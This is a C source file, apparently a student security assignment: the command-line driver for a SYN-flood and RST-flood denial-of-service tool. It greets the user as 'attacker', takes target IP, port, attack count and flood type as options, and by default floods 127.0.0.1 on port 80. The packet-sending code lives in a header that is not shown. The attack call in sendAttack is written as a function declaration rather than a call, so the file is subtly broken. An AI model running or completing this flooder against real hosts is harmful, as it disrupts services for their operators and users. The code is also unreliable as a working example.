/**
*main file for Assigment 3 of Program Security
*Author Alexey Titov
*Version 1.0
**/
//library
#include "Attacker.h"

//this procedure print instraction how user run this program
void printInstruction(){
	puts("****************************************************************************************************************************");
    puts("*\n*Hello attacker, this is how you run this program:");
	puts("*\t-Next time, you can run:");
    puts("*\t\tUsage:[Administrator]  ./attack [-t IP_Address] [-p Port_Address] [-n number] [-r]");
	puts("*\t-Now, the program run by default configuration:");
	puts("*\t\tBy default (using no flags): \t the code will attack the address: 127.0.0.1 on port: 80 number: 1 with: SYN-FLOOD");
    puts("*\n*\n* Options:");
    puts("*\t-t IP_Address\t\t floods the specified host");
    puts("*\t-p Port_Address\t\t floods the host on the specified port");
	puts("*\t-n number\t\t number of attacks");
    puts("*\t-r \t\t\t switches the attack from SYN-FLOOD to RST-FLOOD\n");
	puts("****************************************************************************************************************************");
}

//this function checks if the entered address is correct 0-no, other-yes
int checkIP(const char * ip){
	struct sockaddr_in tmp;
	return inet_aton(ip, &tmp.sin_addr);
}

//this function check port and return number of port if he is coorrect otherwise -1
int checkPort(const char * port){
	char *str;
	//converts important string part to long base 10
	//and set number to resultPort and if there were more characters transmitting them to str
    long resultPort = strtol(port, &str, 10);
    if (str[0] != '\0')										//characters 
		return -1;
    else 
		if (resultPort>= 0 && resultPort <= MAX_PORT_NUM)	//ports between 0-65535
			return (int)resultPort;
	return -1;
}

//this function check number and return number of attacks if he is coorrect otherwise -1
int checkNum(const char* number){
	char *str;
	//converts important string part to long base 10
	//and set number to resultPort and if there were more characters transmitting them to str
    long resultNum = strtol(number, &str, 10);
    if (str[0] != '\0')										//characters 
		return -1;
    else 
		if (resultNum> 0 && resultNum <= INT_MAX)			
			return (int)resultNum;
	return -1;
}

//this function attack dstAddr via dstPort
void sendAttack(const char * dstAddr,const int dstPort,const int isSyn, const int number){
	puts("Start attack...\n");
	void CreateAndSend(dstAddr, dstPort, isSyn, number);
	puts("\n\nFinished attack...");
}

//main
int main(int argc, char *argv[]){

    char dstAddr[IP_LENGTH+1] = LOCAL_HOST; 	//default IP Address: 127.0.0.1
    int dstPort = HTTP; 						//default Port: 80
	int num=NUM;								//default number: 1
    int isSyn = 1; 								// 1=SYN_FLOOD (default) ; 0=RST_FLOOD
	int opt; 									//flag reader (-t, -p, -r)
	printInstruction();
    if (argc<2)									//default	127.0.0.1 80 SYN_FLOOD
		sendAttack(dstAddr, dstPort, isSyn, num);
    else 
		if (argv[1][0] != '-'){
			puts("Err, input is incorrect!");
		}else{
	    	while ((opt = getopt (argc, argv, "t:p:n:r")) != -1){
				switch(opt){
    		    	case 116:														//'t'
    		        	if(strlen(optarg) <= IP_LENGTH && checkIP(optarg)){
    		           		strcpy(dstAddr, optarg);
    		        	}else{
    		            	puts("IP Address is incorrect");
    		            	return 1;
    		        	}
    		        	break;
    		    	case 112:														//'p'
    		        	dstPort = checkPort(optarg);
    		        	if (dstPort == -1){
    		            	printf("Port address is incorrect");
    		            	return 1;
    		        	}
    		        	break;
					case 110:														//'n'
    		        	num = checkNum(optarg);
    		        	if (num == -1){
    		            	printf("number of attacks is incorrect");
    		            	return 1;
    		        	}
    		        	break;
    		    	case 114:														//'r'
    		        	isSyn = 0;	//RST_FLOOD
    		        	break;
					default:
    		        	puts("Err, input is incorrect!");
    		        	return 1;
	    		}
	        }
 	   		sendAttack(dstAddr, dstPort, isSyn, num); //Attack with the received parameters
    	}
    return 0;
}